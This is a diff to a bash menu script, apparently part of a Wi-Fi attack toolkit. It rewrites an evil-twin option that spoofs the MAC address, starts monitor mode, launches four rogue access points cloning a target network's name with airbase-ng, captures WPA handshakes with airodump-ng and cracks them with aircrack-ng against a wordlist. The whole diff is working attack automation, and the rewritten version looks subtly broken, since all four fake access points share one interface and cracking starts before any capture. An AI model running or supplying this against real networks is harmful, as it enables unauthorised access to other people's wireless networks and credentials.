@@ -638,67 +638,51 @@ read
 
 elif [ "$x" == "$honeywhy" ]; then                    #hynull-Option-9
 clear
-echo -n "Wireless interface wlan1 or wlan0 ??"
+# Get user dictionary
+echo -n "Enter the directory along with the wordlist name and extension"
+read dictpass
+# Get wireless interface
+echo -n "Enter wireless interface (e.g. wlan1 or wlan0): "
 read iface
-echo "-> we will start the monitor mode in mon0 "
-ifconfig $iface down
-macchanger -r $iface
-ifconfig $iface up
-airmon-ng start $iface
-echo "we will start the airodumpn-ng please note the probe name "
-gnome-terminal exec airodump-ng check kill mon0 &
-pid1=$!
-echo "note the name below the probe once you have got it close "
-echo "the small window"
-echo "also note the channel please "
-echo -n "whats the essid i.e probe name"
-read essid
-echo -n " channel ??"
-read ch
-kill $pid1
-echo "CREATING FOUR FAKE AP with the name of $essid "
-airmon-ng start $iface #open mon1
-airmon-ng start $iface #wep mon2
-airmon-ng start $iface #wpa mon3
-airmon-ng start $iface #wpa2 psk mon4
-sleep 2
-gnome-terminal exec airbase-ng --essid $essid -a aa:aa:aa:aa:aa:aa -c $ch mon1 &
-pid2=$!
-sleep 2
-gnome-terminal exec airbase-ng --essid $essid -a bb:bb:bb:bb:bb:bb -c $ch mon2 -W 1 &
-pid3=$!
-sleep 2
-gnome-terminal exec airbase-ng --essid $essid -a cc:cc:cc:cc:cc:cc -c $ch mon3 -W 1 -z 2 &
-pid4=$!
-sleep 2
-gnome-terminal exec airbase-ng --essid $essid -a dd:dd:dd:dd:dd:dd -c $ch mon4 -W 1 -Z 4 &
-pid5=$!
-sleep 2
-echo "all ap up and running ..."
-echo "Dumping The Handshake If Any...."
-echo -n "give the file a name"
-read fname
-echo "If there is any handshake close the dialog box ... "
-gnome-terminal exec airodump-ng --channel $ch --write $fname mon0
-sleep 2
-kill $pid2
-kill $pid3
-kill $pid4
-kill $pid5
-echo "Launching the attack fingers crossed we did it .. HOPEFULLY"
-aircrack-ng -w /usr/share/rockyou.txt $fname-01.cap
-sleep 3
-echo -n "So we done lets quit."
-read s
-airmon-ng stop mon4
-airmon-ng stop mon3
-airmon-ng stop mon2
-airmon-ng stop mon1
-airmon-ng stop mon1
-airmon-ng stop wlan1
-airmon-ng stop wlan0
-echo "shutting down..."
 
+# Put wireless interface into monitor mode
+echo "Putting wireless interface into monitor mode..."
+ip link set dev $iface down
+macchanger -r $iface
+ip link set dev $iface up
+airmon-ng start $iface
+
+# Get target ESSID and channel
+echo -n "Enter target ESSID: "
+read essid
+echo -n "Enter target channel: "
+read ch
+
+# Create four fake access points
+echo "Creating four fake access points with name $essid..."
+xterm -hold -e "airbase-ng --essid $essid -a aa:aa:aa:aa:aa:aa -c $ch mon0" &
+pid1=$!
+xterm -hold -e "airbase-ng --essid $essid -a bb:bb:bb:bb:bb:bb -c $ch mon0 -W 1" &
+pid2=$!
+xterm -hold -e "airbase-ng --essid $essid -a cc:cc:cc:cc:cc:cc -c $ch mon0 -W 1 -z 2" &
+pid3=$!
+xterm -hold -e "airbase-ng --essid $essid -a dd:dd:dd:dd:dd:dd -c $ch mon0 -W 1 -Z 4" &
+pid4=$!
+
+# Capture and save handshake
+echo -n "Enter a name for the output file: "
+read fname
+xterm -hold -e "airodump-ng --channel $ch --write $fname mon0" &
+pid5=$!
+
+# Attempt to crack the password
+echo "Attempting to crack password using a strong dictionary..."
+aircrack-ng -w $dictpass $fname-01.cap
+
+# Cleanup
+echo "Cleaning up..."
+kill $pid1 $pid2 $pid3 $pid4 $pid5
+airmon-ng stop mon0
 read
 
 elif [ "$x" == "$dumpitall" ]; then                    #hynull-Option-9
